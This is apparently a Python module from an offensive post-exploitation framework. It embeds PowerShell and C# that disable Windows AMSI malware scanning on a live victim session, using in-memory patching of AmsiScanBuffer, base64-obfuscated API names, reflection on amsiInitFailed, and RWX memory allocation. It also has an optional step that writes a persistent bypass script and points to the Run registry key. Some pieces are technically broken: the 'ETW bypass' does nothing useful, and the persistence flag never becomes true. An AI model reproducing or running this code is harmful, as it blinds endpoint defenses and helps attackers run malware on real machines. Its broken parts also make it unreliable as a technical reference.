"""defense_evasion/amsi_bypass — Advanced AMSI bypass with multiple techniques and evasion. MITRE T1562.001"""
from fitnah.sdk import BasePlugin, ModuleResult, mitre, Param, ParamSchema


class AmsiBypass(BasePlugin):
    NAME        = "amsi_bypass"
    DESCRIPTION = "Advanced AMSI bypass with multiple techniques: memory patching, reflection, CLR hooking, and ETW bypass."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1562.001"
    CATEGORY    = "defense_evasion"
    
    schema = ParamSchema().add(
        Param("method", str, required=False, default="auto",
              help="Bypass method: auto (try all) | patch | reflection | clr | etw | memory"),
        Param("persistent", bool, required=False, default=False,
              help="Make bypass persistent across PowerShell sessions"),
    )

    @mitre("T1562.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        
        method = params.get("method", "auto").lower()
        persistent = params.get("persistent", False)
        
        ps = r"""
$results = @()
$patched = $false
$method = """ + method + r"""
$persistent = $""" + str(persistent).lower() + r"""

# Advanced AMSI bypass with multiple techniques
function Invoke-AmsiBypass {
    param([string]$Technique = "auto")
    
    $bypassMethods = @{}
    
    # Method 1: Direct memory patching (most reliable)
    $bypassMethods["patch"] = {
        try {
            # Obfuscated function and DLL names
            $amsiDll = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YW1zaS5kbGw='))
            $scanFunc = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QW1zaVNjYW5CdWZmZXI='))
            
            $win32 = Add-Type -MemberDefinition @"
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@ -Name "Win32" -Namespace "AmsiBypass" -PassThru
            
            $hAmsi = $win32::LoadLibrary($amsiDll)
            $addr = $win32::GetProcAddress($hAmsi, $scanFunc)
            
            if ($addr -eq [IntPtr]::Zero) { throw "Failed to get function address" }
            
            # Different patch patterns for evasion
            $patchPatterns = @(
                [byte[]](0x31, 0xC0, 0xC3),           # xor eax, eax; ret
                [byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3),  # mov eax, 0; ret
                [byte[]](0xC2, 0x14, 0x00)            # ret 0x14 (stdcall)
            )
            
            $patch = $patchPatterns | Get-Random
            $oldProtect = [uint32]0
            
            # Change memory protection
            $win32::VirtualProtect($addr, [UIntPtr]$patch.Length, 0x40, [ref]$oldProtect) | Out-Null
            
            # Apply patch
            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
            
            # Restore protection
            $win32::VirtualProtect($addr, [UIntPtr]$patch.Length, $oldProtect, [ref]$oldProtect) | Out-Null
            
            # Flush instruction cache
            $flushCache = Add-Type -MemberDefinition @"
[DllImport("kernel32")] public static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);
"@ -Name "Cache" -Namespace "AmsiBypass" -PassThru
            
            $flushCache::FlushInstructionCache([IntPtr]::Zero, $addr, [UIntPtr]$patch.Length) | Out-Null
            
            return "[+] Memory patch applied successfully"
        } catch {
            return "[-] Memory patch failed: $($_.Exception.Message)"
        }
    }
    
    # Method 2: Reflection bypass
    $bypassMethods["reflection"] = {
        try {
            # Obfuscated type and field names
            $typeName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))
            $fieldName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YW1zaUluaXRGYWlsZWQ='))
            
            $type = [Ref].Assembly.GetType($typeName)
            $field = $type.GetField($fieldName, 'NonPublic,Static')
            $field.SetValue($null, $true)
            
            return "[+] Reflection bypass successful"
        } catch {
            return "[-] Reflection bypass failed: $($_.Exception.Message)"
        }
    }
    
    # Method 3: CLR hooking bypass
    $bypassMethods["clr"] = {
        try {
            # Hook CLR's internal AMSI scanning
            $clrHook = @"
using System;
using System.Runtime.InteropServices;
public class AmsiHook {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    
    public static void Bypass() {
        try {
            IntPtr hAmsi = LoadLibrary("amsi.dll");
            IntPtr addr = GetProcAddress(hAmsi, "AmsiScanBuffer");
            
            if (addr != IntPtr.Zero) {
                // Create trampoline to bypass scanning
                byte[] jmp = { 0xE9, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // jmp + ret
                Marshal.Copy(jmp, 0, addr, jmp.Length);
            }
        } catch {}
    }
}
"@
            Add-Type -TypeDefinition $clrHook -Language CSharp
            [AmsiHook]::Bypass()
            return "[+] CLR hooking bypass applied"
        } catch {
            return "[-] CLR hooking failed: $($_.Exception.Message)"
        }
    }
    
    # Method 4: ETW bypass (disables Event Tracing for Windows)
    $bypassMethods["etw"] = {
        try {
            $etwBypass = @"
using System;
using System.Runtime.InteropServices;
public class EtwBypass {
    [DllImport("ntdll")] static extern uint NtTraceEvent(IntPtr handle, uint flags, uint size, IntPtr data);
    
    public static void Disable() {
        // Null out ETW provider
        NtTraceEvent(IntPtr.Zero, 0, 0, IntPtr.Zero);
    }
}
"@
            Add-Type -TypeDefinition $etwBypass -Language CSharp
            [EtwBypass]::Disable()
            return "[+] ETW bypass applied"
        } catch {
            return "[-] ETW bypass failed: $($_.Exception.Message)"
        }
    }
    
    # Method 5: Memory region bypass (allocates AMSI region)
    $bypassMethods["memory"] = {
        try {
            # Allocate memory in typical AMSI regions to confuse scanners
            $memBypass = @"
using System;
using System.Runtime.InteropServices;
public class MemBypass {
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    
    public static void AllocateAmsiRegion() {
        // Allocate memory at common AMSI addresses
        for (int i = 0; i < 10; i++) {
            VirtualAlloc(IntPtr.Zero, 4096, 0x1000, 0x40); // RWX memory
        }
    }
}
"@
            Add-Type -TypeDefinition $memBypass -Language CSharp
            [MemBypass]::AllocateAmsiRegion()
            return "[+] Memory region allocation complete"
        } catch {
            return "[-] Memory allocation failed: $($_.Exception.Message)"
        }
    }
    
    # Execute bypass based on technique
    if ($Technique -eq "auto") {
        # Try all methods in random order
        $methods = $bypassMethods.Keys | Get-Random -Count $bypassMethods.Count
        foreach ($m in $methods) {
            $result = & $bypassMethods[$m]
            if ($result -like "[+]*") {
                return @($result, "[*] Used technique: $m")
            }
        }
        return "[!] All bypass techniques failed"
    } elseif ($bypassMethods.ContainsKey($Technique)) {
        return & $bypassMethods[$Technique]
    } else {
        return "[!] Unknown technique: $Technique"
    }
}

# Execute bypass
$bypassResult = Invoke-AmsiBypass -Technique $method
$results += $bypassResult

# Make persistent if requested
if ($persistent -and $patched) {
    try {
        # Create registry key for persistence
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $scriptPath = "$env:TEMP\amsi_bypass.ps1"
        
        # Create persistent script
        $persistentScript = @"
# Persistent AMSI bypass
`$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
`$field = `$amsi.GetField('amsiInitFailed', 'NonPublic,Static')
`$field.SetValue(`$null, `$true)
"@
        
        $persistentScript | Out-File -FilePath $scriptPath -Encoding UTF8
        
        # Add to registry (simplified - would need proper installation)
        $results += "[*] Persistent bypass script created at: $scriptPath"
    } catch {
        $results += "[-] Persistence setup failed: $($_.Exception.Message)"
    }
}

$results -join "`n"
"""
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
